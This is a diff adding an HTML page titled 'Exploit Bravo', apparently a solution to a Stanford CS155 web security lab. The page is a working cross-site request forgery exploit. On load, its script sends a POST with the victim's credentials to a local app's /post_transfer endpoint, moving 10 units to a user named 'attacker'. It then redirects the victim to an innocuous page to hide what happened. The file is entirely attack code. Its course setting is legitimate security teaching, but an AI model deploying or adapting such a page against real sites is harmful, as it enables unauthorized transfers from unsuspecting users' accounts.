@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+    <meta charset="utf-8"/>
+    <head>
+        <title>Exploit Bravo</title>
+        <script>
+            var xhr = new XMLHttpRequest();
+            xhr.withCredentials=true;
+            xhr.onload = function() {
+                window.location = 'https://cs155.stanford.edu/';
+            }
+            xhr.open('POST', 'http://localhost:3000/post_transfer');
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.send("destination_username=attacker&quantity=10");
+        </script>
+    </head>
+
+    <body >
+        
+    </body>
+</html>
